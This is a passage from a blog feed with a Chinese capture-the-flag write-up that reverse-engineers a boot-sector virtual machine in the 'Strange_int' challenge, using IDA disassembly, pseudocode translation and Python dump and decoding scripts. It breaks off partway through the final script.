        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="cgctf" scheme="https://mrh1s.top/categories/write-up/cgctf/"/>
    
    
      <category term="RE_Static" scheme="https://mrh1s.top/tags/RE-Static/"/>
    
  </entry>
  
  <entry>
    <title>补题：Strange_int</title>
    <link href="https://mrh1s.top/posts/d2cf12e4/"/>
    <id>https://mrh1s.top/posts/d2cf12e4/</id>
    <published>2019-05-13T15:06:14.000Z</published>
    <updated>2019-05-21T07:54:20.500Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="strange-int"><a href="#strange-int" class="headerlink" title="strange int"></a>strange int</h1><p><a href="\uploads\strange_int.7z">strange_int</a></p><blockquote><p>打国赛的时候没做出来这道题，现在看了题解来补一补</p></blockquote><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>以前写过FAT16的模拟程序，看到这个文件第一想法是这是一个DBR</p><p>第一行的 jmp 就是 jump 到这个命令的下一个命令。。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">seg000:0000                 jmp     far ptr 7C0h:5</span><br><span class="line">seg000:0005 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:0005                 mov     ax, cs</span><br><span class="line">seg000:0007                 mov     ds, ax</span><br><span class="line">seg000:0009                 mov     ss, ax</span><br><span class="line">seg000:000B                 mov     sp, 400h</span><br><span class="line">seg000:000E                 cld</span><br><span class="line">seg000:000F                 mov     ax, 3</span><br><span class="line">seg000:0012                 int     10h             ; - VIDEO - SET VIDEO MODE</span><br><span class="line">seg000:0012                                         ; AL = mode</span><br><span class="line">seg000:0014                 mov     dx, 0</span><br><span class="line">seg000:0017                 mov     cx, 2</span><br><span class="line">seg000:001A                 mov     ax, 1000h</span><br><span class="line">seg000:001D                 mov     es, ax</span><br><span class="line">seg000:001F                 assume es:nothing</span><br><span class="line">seg000:001F                 xor     bx, bx</span><br><span class="line">seg000:0021                 mov     ax, 228h</span><br><span class="line">seg000:0024                 int     13h             ; DISK - READ SECTORS INTO MEMORY</span><br><span class="line">seg000:0024                                         ; AL = number of sectors to read, CH = track, CL = sector</span><br><span class="line">seg000:0024                                         ; DH = head, DL = drive, ES:BX -&gt; buffer to fill</span><br><span class="line">seg000:0024                                         ; Return: CF set on error, AH = status, AL = number of sectors read</span><br><span class="line">seg000:0026                 jnb     short loc_2A</span><br><span class="line">seg000:0028</span><br><span class="line">seg000:0028 loc_28:                                 ; CODE XREF: seg000:loc_28↓j</span><br><span class="line">seg000:0028                 jmp     short loc_28</span><br><span class="line">seg000:002A ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:002A</span><br><span class="line">seg000:002A loc_2A:                                 ; CODE XREF: seg000:0026↑j</span><br><span class="line">seg000:002A                 cli</span><br><span class="line">seg000:002B                 mov     ax, 1000h</span><br><span class="line">seg000:002E                 mov     ds, ax</span><br><span class="line">seg000:0030                 assume ds:nothing</span><br><span class="line">seg000:0030                 xor     ax, ax</span><br><span class="line">seg000:0032                 mov     es, ax</span><br><span class="line">seg000:0034                 assume es:nothing</span><br><span class="line">seg000:0034                 mov     cx, 2000h</span><br><span class="line">seg000:0037                 sub     si, si</span><br><span class="line">seg000:0039                 sub     di, di</span><br><span class="line">seg000:003B                 rep movsb</span><br><span class="line">seg000:003D                 mov     ax, 7C0h</span><br><span class="line">seg000:0040</span><br><span class="line">seg000:0040 loc_40:                                 ; DATA XREF: seg000:0012↑r</span><br><span class="line">seg000:0040                 mov     ds, ax</span><br><span class="line">seg000:0042                 assume ds:nothing</span><br><span class="line">seg000:0042                 lidt    fword ptr ds:6Fh</span><br><span class="line">seg000:0047                 lgdt    fword ptr ds:75h</span><br><span class="line">seg000:004C</span><br><span class="line">seg000:004C loc_4C:                                 ; DATA XREF: seg000:0024↑r</span><br><span class="line">seg000:004C                 mov     ax, 1</span><br><span class="line">seg000:004F                 lmsw    ax</span><br><span class="line">seg000:0052                 jmp     far ptr 8:0</span><br></pre></td></tr></table></figure><p>然后就跳转到一个神秘的鬼地方去了</p><p>程序大概是把ebx置0了，然后作为计数变量，一共循环了10h次</p><p>把一堆数送到了内存中，经高人指点，这堆数属于中断向量</p><p>（也就是VM里面的操作数，对应相应的操作）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">seg000:000001FE ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:000001FE                 push    ebp</span><br><span class="line">seg000:000001FF                 stosb</span><br><span class="line">seg000:00000200                 mov     eax, 10h</span><br><span class="line">seg000:00000205                 mov     ds, eax</span><br><span class="line">seg000:00000207                 assume ds:nothing</span><br><span class="line">seg000:00000207                 lss     esp, large ds:0B5Ch</span><br><span class="line">seg000:0000020E                 call    sub_28B</span><br><span class="line">seg000:00000213                 call    sub_283</span><br><span class="line">seg000:00000218                 mov     eax, 10h        ; DATA XREF: sub_28B+27↓r</span><br><span class="line">seg000:0000021D                 mov     ds, eax</span><br><span class="line">seg000:0000021F                 mov     es, eax</span><br><span class="line">seg000:00000221                 assume es:nothing</span><br><span class="line">seg000:00000221                 mov     fs, eax         ; DATA XREF: sub_283↓r</span><br><span class="line">seg000:00000223                 assume fs:nothing</span><br><span class="line">seg000:00000223                 mov     gs, eax</span><br><span class="line">seg000:00000225                 assume gs:nothing</span><br><span class="line">seg000:00000225</span><br><span class="line">seg000:00000225 loc_225:                                ; DATA XREF: sub_28B+11↓o</span><br><span class="line">seg000:00000225                 lss     esp, large ds:0B5Ch</span><br><span class="line">seg000:0000022C                 xor     ebx, ebx</span><br><span class="line">seg000:0000022E</span><br><span class="line">seg000:0000022E loc_22E:                                ; CODE XREF: seg000:0000025D↓j</span><br><span class="line">seg000:0000022E                 nop</span><br><span class="line">seg000:0000022F                 cmp     ebx, 10h</span><br><span class="line">seg000:00000232                 jge     short loc_25F</span><br><span class="line"></span><br><span class="line">seg000:00000234                 mov     eax, 80000h</span><br><span class="line">seg000:00000239                 lea     edx, ds:0D08h[ebx*4] ;这个内存里面全部存的0</span><br><span class="line">seg000:00000240                 mov     edx, [edx]</span><br><span class="line">seg000:00000242                 mov     ax, dx</span><br><span class="line">seg000:00000245                 mov     dx, 8E00h</span><br><span class="line">seg000:00000249                 mov     ecx, 21h ; &apos;!&apos; ;21h</span><br><span class="line">seg000:0000024E                 add     ecx, ebx    ;21h + ebx， </span><br><span class="line">;也就是把21h开始的10h个数作为操作数</span><br><span class="line">seg000:00000250                 lea     esi, ds:128h[ecx*8]</span><br><span class="line">seg000:00000257                 mov     [esi], eax</span><br><span class="line">seg000:00000259                 mov     [esi+4], edx</span><br><span class="line">seg000:0000025C                 inc     ebx</span><br><span class="line">seg000:0000025D                 jmp     short loc_22E</span><br><span class="line">seg000:0000025F ; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># 后面是多次中断进行操作</span><br><span class="line">seg000:0000025F</span><br><span class="line">seg000:0000025F loc_25F:                                ; CODE XREF: seg000:00000232↑j</span><br><span class="line">seg000:0000025F                                         ; seg000:00000266↓j</span><br><span class="line">seg000:0000025F                 call    sub_268</span><br><span class="line">seg000:00000264                 int     21h             ; DOS -</span><br><span class="line">seg000:00000266                 jmp     short loc_25F</span><br></pre></td></tr></table></figure><h3 id="switch跳转语句"><a href="#switch跳转语句" class="headerlink" title="switch跳转语句"></a>switch跳转语句</h3><p>中断之前call的sub_268汇编代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">seg000:00000268 sub_268         proc near               ; CODE XREF: seg000:loc_25F↑p</span><br><span class="line">seg000:00000268                 mov     edi, large ds:0B78h</span><br><span class="line">seg000:0000026E                 lea     edi, ds:0D48h[edi*4]</span><br><span class="line">seg000:00000275                 mov     eax, [edi]</span><br><span class="line">seg000:00000277                 mov     large ds:65h, al</span><br><span class="line">seg000:0000027C                 mov     ecx, [edi+4]</span><br><span class="line">seg000:0000027F                 mov     eax, [edi+8]</span><br><span class="line">seg000:00000282                 retn</span><br><span class="line">seg000:00000282 sub_268         endp</span><br></pre></td></tr></table></figure><p>操作数1被送入内存了</p><p>ecx应该是操作数2</p><p>eax是操作数3</p><h3 id="各个case"><a href="#各个case" class="headerlink" title="各个case"></a>各个case</h3><h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><p>以下是每个操作数对应的操作， 因为所有的操作数是依次出现的 ，所以只需要挨着翻译就好了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">seg000:00000D7C ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000D7C                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg000:00000D83                 mov     [ecx], eax</span><br><span class="line">seg000:00000D85                 jmp     loc_EF8</span><br><span class="line">seg000:00000D8A ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000D8A                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg000:00000D91                 mov     eax, [eax]</span><br><span class="line">seg000:00000D93                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg000:00000D9A                 mov     [ecx], eax</span><br><span class="line">seg000:00000D9C                 jmp     loc_EF8</span><br><span class="line">seg000:00000DA1 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000DA1                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg000:00000DA8                 mov     eax, [eax]</span><br><span class="line">seg000:00000DAA                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg000:00000DB1                 lea     eax, ds:0D48h[eax*4]</span><br><span class="line">seg000:00000DB8                 mov     eax, [eax]</span><br><span class="line">seg000:00000DBA                 mov     [ecx], eax</span><br><span class="line">seg000:00000DBC                 jmp     loc_EF8</span><br><span class="line">seg000:00000DC1 ; ---------------------------------------------------------------------------seg000:00000DC1                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg000:00000DC8                 mov     eax, [eax]</span><br><span class="line">seg000:00000DCA                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg000:00000DD1                 mov     ecx, [ecx]</span><br><span class="line">seg000:00000DD3                 lea     ecx, ds:0D48h[ecx*4]</span><br><span class="line">seg000:00000DDA                 mov     [ecx], eax</span><br><span class="line">seg000:00000DDC                 jmp     loc_EF8</span><br><span class="line">seg000:00000DE1 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000DE1                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg000:00000DE8                 mov     edx, [eax]</span><br><span class="line">seg000:00000DEA                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg000:00000DF1                 mov     eax, [ecx]</span><br><span class="line">seg000:00000DF3                 add     eax, edx</span><br><span class="line">seg000:00000DF5                 mov     [ecx], eax</span><br><span class="line">seg000:00000DF7                 jmp     loc_EF8</span><br><span class="line">seg000:00000DFC ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000DFC                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg000:00000E03                 mov     edx, [eax]</span><br><span class="line">seg000:00000E05                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg000:00000E0C                 mov     eax, [ecx]</span><br><span class="line">seg000:00000E0E                 sub     eax, edx</span><br><span class="line">seg000:00000E10                 mov     [ecx], eax</span><br><span class="line">seg000:00000E12                 jmp     loc_EF8</span><br><span class="line">seg000:00000E17 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000E17                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg000:00000E1E                 mov     edx, [eax]</span><br><span class="line">seg000:00000E20                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg000:00000E27                 mov     eax, [ecx]</span><br><span class="line">seg000:00000E29                 xor     eax, edx</span><br><span class="line">seg000:00000E2B                 mov     [ecx], eax</span><br><span class="line">seg000:00000E2D                 jmp     loc_EF8</span><br><span class="line">seg000:00000E32 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000E32                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg000:00000E39                 mov     eax, [eax]</span><br><span class="line">seg000:00000E3B                 lea     edx, ds:0B64h[ecx*4]</span><br><span class="line">seg000:00000E42                 mov     cl, al</span><br><span class="line">seg000:00000E44                 mov     eax, [edx]</span><br><span class="line">seg000:00000E46                 shl     eax, cl</span><br><span class="line">seg000:00000E48                 mov     [edx], eax</span><br><span class="line">seg000:00000E4A                 jmp     loc_EF8</span><br><span class="line">seg000:00000E4F ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000E4F                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg000:00000E56                 mov     eax, [eax]</span><br><span class="line">seg000:00000E58                 lea     edx, ds:0B64h[ecx*4]</span><br><span class="line">seg000:00000E5F                 mov     cl, al</span><br><span class="line">seg000:00000E61                 mov     eax, [edx]</span><br><span class="line">seg000:00000E63                 shr     eax, cl</span><br><span class="line">seg000:00000E65                 mov     [edx], eax</span><br><span class="line">seg000:00000E67                 jmp     loc_EF8</span><br><span class="line">seg000:00000E6C ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000E6C                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg000:00000E73                 mov     eax, [eax]</span><br><span class="line">seg000:00000E75                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg000:00000E7C                 mov     edx, [ecx]</span><br><span class="line">seg000:00000E7E                 and     eax, edx</span><br><span class="line">seg000:00000E80                 mov     [ecx], eax</span><br><span class="line">seg000:00000E82                 jmp     short loc_EF8</span><br><span class="line">seg000:00000E84 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000E84                 lea     eax, ds:0B64h[ecx*4]</span><br><span class="line">seg000:00000E8B                 mov     eax, [eax]</span><br><span class="line">seg000:00000E8D                 lea     ecx, unk_B78</span><br><span class="line">seg000:00000E93                 mov     [ecx], eax</span><br><span class="line">seg000:00000E95                 iret</span><br><span class="line">seg000:00000E96 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000E96                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg000:00000E9D                 mov     eax, [eax]</span><br><span class="line">seg000:00000E9F                 test    eax, eax</span><br><span class="line">seg000:00000EA1                 jnz     short loc_EF8</span><br><span class="line">seg000:00000EA3                 lea     eax, ds:0B64h[ecx*4]</span><br><span class="line">seg000:00000EAA                 mov     eax, [eax]</span><br><span class="line">seg000:00000EAC                 lea     ecx, unk_B78</span><br><span class="line">seg000:00000EB2                 mov     [ecx], eax</span><br><span class="line">seg000:00000EB4                 iret</span><br><span class="line">seg000:00000EB5 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000EB5                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg000:00000EBC                 mov     eax, [eax]</span><br><span class="line">seg000:00000EBE                 test    eax, eax</span><br><span class="line">seg000:00000EC0                 jz      short loc_EF8</span><br><span class="line">seg000:00000EC2                 lea     eax, ds:0B64h[ecx*4]</span><br><span class="line">seg000:00000EC9                 mov     eax, [eax]</span><br><span class="line">seg000:00000ECB                 lea     ecx, unk_B78</span><br><span class="line">seg000:00000ED1                 mov     [ecx], eax</span><br><span class="line">seg000:00000ED3                 iret</span><br><span class="line">seg000:00000ED4 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000ED4                 lea     eax, unk_F94</span><br><span class="line">seg000:00000EDA                 call    sub_2EA</span><br><span class="line">seg000:00000EDF                 hlt</span><br><span class="line">seg000:00000EE0 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000EE0                 lea     eax, unk_FA0</span><br><span class="line">seg000:00000EE6                 call    sub_2EA</span><br><span class="line">seg000:00000EEB                 lea     eax, word_FAE</span><br><span class="line">seg000:00000EF1                 call    sub_2EA</span><br><span class="line">seg000:00000EF6                 hlt</span><br><span class="line">seg000:00000EF6 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000EF7                 db 0F4h</span><br><span class="line">seg000:00000EF8 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00000EF8</span><br><span class="line">seg000:00000EF8 loc_EF8:                                ; CODE XREF: seg000:00000D85↑j</span><br><span class="line">seg000:00000EF8                                         ; seg000:00000D9C↑j ...</span><br><span class="line">seg000:00000EF8                 lea     ecx, unk_B78</span><br><span class="line">seg000:00000EFE                 mov     eax, [ecx]</span><br><span class="line">seg000:00000F00                 add     eax, 3</span><br><span class="line">seg000:00000F03                 mov     [ecx], eax</span><br><span class="line">seg000:00000F05                 iret</span><br><span class="line">seg000:00000F05 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><h4 id="翻译后"><a href="#翻译后" class="headerlink" title="翻译后"></a>翻译后</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">buf[a] = b</span><br><span class="line">buf[a] = buf[b]</span><br><span class="line">buf[a] = (dword) opt[buf[b]]</span><br><span class="line">(dword) opt[buf[a]] = buf[b]</span><br><span class="line">buf[a] += buf[b]</span><br><span class="line">buf[a] -= buf[b]</span><br><span class="line">buf[a] ^= buf[b]</span><br><span class="line">buf[a] &lt;&lt;= buf[b]</span><br><span class="line">buf[a] &gt;&gt;= buf[b]</span><br><span class="line">buf[a] &amp;= buf[b]</span><br><span class="line">temp = buf[a]</span><br><span class="line"><span class="keyword">if</span>(buf[b] == <span class="number">0</span>)  temp = buf[a]</span><br><span class="line"><span class="keyword">if</span>(buf[b] != <span class="number">0</span>)  temp = buf[a]</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"wrong"</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"right"</span>)</span><br></pre></td></tr></table></figure><h3 id="指令数组"><a href="#指令数组" class="headerlink" title="指令数组"></a>指令数组</h3><h4 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h4><p>数据区，存储操作数，这个是通过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">seg000:0000026E                 lea     edi, ds:0D48h[edi*4]</span><br></pre></td></tr></table></figure><p>算出来的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">seg000:00000F48                 db  21h ; !             ; data start</span><br><span class="line">seg000:00000F49                 db    0</span><br><span class="line">seg000:00000F4A                 db    0</span><br><span class="line">seg000:00000F4B                 db    0</span><br><span class="line">seg000:00000F4C                 db    0</span><br><span class="line">seg000:00000F4D                 db    0</span><br><span class="line">seg000:00000F4E                 db    0</span><br><span class="line">seg000:00000F4F                 db    0</span><br><span class="line">seg000:00000F50                 db  81h</span><br><span class="line">seg000:00000F51                 db    0</span><br><span class="line">seg000:00000F52                 db    0</span><br><span class="line">seg000:00000F53                 db    0</span><br><span class="line">seg000:00000F54                 db  27h ; &apos;</span><br><span class="line">seg000:00000F55                 db    0</span><br><span class="line">seg000:00000F56                 db    0</span><br><span class="line">seg000:00000F57                 db    0</span><br><span class="line">seg000:00000F58                 dd 2 dup(1), 24h, 2 dup(1), 23h, 2, 0</span><br><span class="line">seg000:00000F78                 db  22h ; &quot;</span><br><span class="line">seg000:00000F79                 align 4</span><br><span class="line">seg000:00000F7C                 db    3</span><br><span class="line">seg000:00000F7D                 align 10h</span><br><span class="line">seg000:00000F80                 db    2</span><br><span class="line">seg000:00000F81                 align 4</span><br><span class="line">seg000:00000F84                 dd offset dword_0+21h</span><br><span class="line">seg000:00000F88                 dd 4, 8, 28h</span><br><span class="line">seg000:00000F94 unk_F94         db    3                 ; DATA XREF: seg000:00000ED4↑o</span><br><span class="line">seg000:00000F95                 align 4</span><br><span class="line">seg000:00000F98                 dd 4, 27h</span><br><span class="line">seg000:00000FA0 unk_FA0         db    2                 ; DATA XREF: seg000:00000EE0↑o</span><br><span class="line">seg000:00000FA1                 align 4</span><br><span class="line">seg000:00000FA4                 db    3</span><br><span class="line">seg000:00000FA5                 align 4</span><br><span class="line">seg000:00000FA8                 dd offset dword_0+28h</span><br><span class="line">seg000:00000FAC                 db    3</span><br><span class="line">seg000:00000FAD                 align 2</span><br><span class="line">seg000:00000FAE word_FAE        dw 0                    ; DATA XREF: seg000:00000EEB↑o</span><br><span class="line">seg000:00000FB0                 dd 4, 27h, 2, 3, 28h, 3, 4, 27h, 2, 3, 27h, 2 dup(3), 23h</span><br><span class="line">seg000:00000FB0                 dd 4, 3, 24h, 3, 2, 27h, 2, 4, 24h, 0</span><br><span class="line">seg000:00001010                 db    2</span><br><span class="line">seg000:00001011                 align 4</span><br><span class="line">seg000:00001014                 dd offset dword_0+21h</span><br><span class="line">seg000:00001018                 dd 2 dup(1), 25h, 0</span><br><span class="line">seg000:00001028                 dd 1, 22h, 1, 0</span><br><span class="line">seg000:00001038                 dd offset dword_0+21h</span><br><span class="line">seg000:0000103C                 db    2</span><br><span class="line">seg000:0000103D                 align 10h</span><br><span class="line">seg000:00001040                 db  81h</span><br><span class="line">seg000:00001041                 align 4</span><br><span class="line">seg000:00001044                 dd offset dword_0+26h</span><br><span class="line">seg000:00001048                 dd 1, 2, 21h, 2, 9, 26h, 1, 2, 21h, 2, 9, 2Dh, 2, 1, 21h</span><br><span class="line">seg000:00001048                 dd 0</span><br><span class="line">seg000:00001088                 db  81h</span><br><span class="line">seg000:00001089                 align 4</span><br><span class="line">seg000:0000108C                 db  22h ; &quot;</span><br><span class="line">seg000:0000108D                 align 10h</span><br><span class="line">seg000:00001090                 dd 1, 0</span><br><span class="line">seg000:00001098                 dd offset dword_0+21h</span><br><span class="line">seg000:0000109C                 db    2</span><br><span class="line">seg000:0000109D                 align 10h</span><br><span class="line">seg000:000010A0                 dd 9, 25h, 1, 2, 23h, 3, 0</span><br><span class="line">seg000:000010BC                 db  23h ; #</span><br><span class="line">seg000:000010BD                 align 10h</span><br><span class="line">seg000:000010C0                 dd 4, 1, 26h, 3, 4, 21h, 4, 7Eh, 2Dh, 4, 3, 21h, 3, 1</span><br><span class="line">seg000:000010C0                 dd 25h, 0</span><br><span class="line">seg000:00001100                 db    3</span><br><span class="line">seg000:00001101                 align 4</span><br><span class="line">seg000:00001104                 db  25h ; %</span><br><span class="line">seg000:00001105                 align 4</span><br><span class="line">seg000:00001108                 dd 1, 3, 26h, 2, 3, 21h, 4, 5Ah, 2Dh, 4, 2, 2Fh, 2 dup(0)</span><br><span class="line">seg000:00001140                 dd offset dword_0+30h</span><br><span class="line">seg000:00001144                 dd 2 dup(0)</span><br><span class="line">seg000:0000114C                 db  38h ; 8</span><br><span class="line">seg000:0000114D                 db 62h, 64h, 61h</span><br></pre></td></tr></table></figure><h4 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">addr = <span class="number">0x0F48</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nopt:"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    opt = Dword(addr)</span><br><span class="line">    a = Dword(addr + <span class="number">4</span>)</span><br><span class="line">    b = Dword(addr + <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">print</span> opt,<span class="string">","</span>,a,<span class="string">","</span>,b,<span class="string">","</span>,</span><br><span class="line">    <span class="keyword">if</span>(opt &gt;= <span class="number">0x2E</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">12</span></span><br></pre></td></tr></table></figure><h4 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h4><p>妈耶，好不容易把指令翻译成了C语言，结果发现这段代码里面还嵌套了类似汇编的指令，还有循环，需要翻译</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>       buf0 = <span class="number">129</span>    <span class="comment">//buf0 = 129</span></span><br><span class="line"><span class="number">1</span>       buf1 ^= buf1   <span class="comment">//buf1 = 0</span></span><br><span class="line"><span class="number">2</span>       (dword) data[buf1] = buf1   <span class="comment">//data[0] = 0</span></span><br><span class="line"><span class="number">3</span>       buf2 = (dword) data[buf0]   <span class="comment">//buf2 = data[129]</span></span><br><span class="line"><span class="number">4</span>       buf3 = buf2                 <span class="comment">//buf3 = data[129]</span></span><br><span class="line"><span class="number">5</span>       buf4 = <span class="number">8</span>    <span class="comment">//buf4 = 8</span></span><br><span class="line"><span class="number">6</span>       buf3 &lt;&lt;= buf4               <span class="comment">//buf3 = data[129] &lt;&lt; 8</span></span><br><span class="line"><span class="number">7</span>       buf2 ^= buf3    <span class="comment">//buf2 = data[129] ^ (data[129] &lt;&lt; 8)</span></span><br><span class="line"><span class="number">8</span>       buf3 &lt;&lt;= buf4        <span class="comment">//buf3 = data[129] &lt;&lt; 16</span></span><br><span class="line"><span class="number">9</span>       buf2 ^= buf3 </span><br><span class="line"><span class="number">10</span>      buf3 &lt;&lt;= buf4</span><br><span class="line"><span class="number">11</span>      buf2 ^= buf3</span><br><span class="line"></span><br><span class="line"><span class="comment">//buf2 = data[129] ^ (data[129] &lt;&lt; 8) ^ (data[129] &lt;&lt; 16) ^ (data[129] &lt;&lt; 24) </span></span><br><span class="line"><span class="comment">//  = afterXor</span></span><br><span class="line"></span><br><span class="line"><span class="number">12</span>      buf3 ^= buf3    <span class="comment">//buf3 = 0</span></span><br><span class="line"><span class="number">13</span>      buf4 = (dword) data[buf3]   <span class="comment">//buf4 = data[0]</span></span><br><span class="line"><span class="number">14</span>      (dword) data[buf3] = buf2   <span class="comment">//data[0] = afterXor</span></span><br><span class="line"><span class="number">15</span>      buf2 ^= buf4                <span class="comment">//buf2 = afterXor ^ data[0]</span></span><br><span class="line"><span class="number">16</span>      (dword) data[buf0] = buf2   <span class="comment">//data[129] = afterXor ^ data[0]</span></span><br><span class="line"><span class="number">17</span>      buf1 = <span class="number">1</span><span class="comment">//buf1 = 1</span></span><br><span class="line"><span class="number">18</span>      buf0 += buf1<span class="comment">//buf0 = 130</span></span><br><span class="line"><span class="number">19</span>      buf1 = buf0<span class="comment">//buf1 = 130</span></span><br><span class="line"><span class="number">20</span>      buf2 = <span class="number">129</span><span class="comment">//buf2 = 129</span></span><br><span class="line"><span class="number">21</span>      buf1 -= buf2<span class="comment">//buf1 = 1</span></span><br><span class="line"><span class="number">22</span>      buf2 = <span class="number">9</span><span class="comment">//buf2 = 9</span></span><br><span class="line"><span class="number">23</span>      buf1 -= buf2<span class="comment">//buf1 = -8</span></span><br><span class="line"><span class="number">24</span>      buf2 = <span class="number">9</span><span class="comment">//buf2 = 9</span></span><br><span class="line"></span><br><span class="line"><span class="number">25</span>      <span class="keyword">if</span>(buf1 != <span class="number">0</span>)  temp = buf2  <span class="comment">//经高人指点，这里是设置eip</span></span><br><span class="line"><span class="comment">//jmp 3</span></span><br><span class="line"></span><br><span class="line"><span class="number">26</span>      buf0 = <span class="number">129</span><span class="comment">//buf0 = 129</span></span><br><span class="line"><span class="number">27</span>      buf1 = buf0<span class="comment">//buf1 = 129</span></span><br><span class="line"><span class="number">28</span>      buf2 = <span class="number">9</span><span class="comment">//buf2 = 9</span></span><br><span class="line"><span class="number">29</span>      buf1 += buf2<span class="comment">//buf1 = 138</span></span><br><span class="line"><span class="number">30</span>      buf3 = (dword) data[buf0]<span class="comment">//buf3 = data[129]</span></span><br><span class="line"><span class="number">31</span>      buf4 = (dword) data[buf1]<span class="comment">//buf4 = data[138]</span></span><br><span class="line"><span class="number">32</span>      buf3 -= buf4<span class="comment">//buf3 = data[129] - data[138]</span></span><br><span class="line"><span class="number">33</span>      buf4 = <span class="number">126</span><span class="comment">//buf4 = 126</span></span><br><span class="line"></span><br><span class="line"><span class="number">34</span>      <span class="keyword">if</span>(buf3 != <span class="number">0</span>)  temp = buf4<span class="comment">//jmp 42</span></span><br><span class="line"></span><br><span class="line"><span class="number">35</span>      buf3 = <span class="number">1</span><span class="comment">//buf3 = 1</span></span><br><span class="line"><span class="number">36</span>      buf0 += buf3<span class="comment">//buf0 = data[129] - data[138] + 129</span></span><br><span class="line"><span class="number">37</span>      buf1 += buf3<span class="comment">//buf1 = 139</span></span><br><span class="line"><span class="number">38</span>      buf2 -= buf3<span class="comment">//buf2 = 8</span></span><br><span class="line"><span class="number">39</span>      buf4 = <span class="number">90</span><span class="comment">//buf4 = 90</span></span><br><span class="line"><span class="number">40</span>      <span class="keyword">if</span>(buf2 != <span class="number">0</span>)  temp = buf4</span><br><span class="line"><span class="number">41</span>      <span class="built_in">printf</span>(<span class="string">"wrong"</span>)</span><br><span class="line"><span class="number">42</span>      <span class="built_in">printf</span>(<span class="string">"right"</span>)</span><br></pre></td></tr></table></figure><h4 id="再翻译"><a href="#再翻译" class="headerlink" title="再翻译"></a>再翻译</h4><p>程序作了一个很奇怪的循环，并且异或了一大堆</p><p>这个程序要逆向实在太难了，考虑到本来这个数据也不大，就暴力枚举</p><p><strong>script from yypE:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(arr)==<span class="number">9</span>)</span><br><span class="line">    last = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        var = <span class="number">0</span></span><br><span class="line">        arr[i] ^= last</span><br><span class="line">        last = arr[i]</span><br><span class="line">        var |= arr[i] &amp; <span class="number">0xff</span></span><br><span 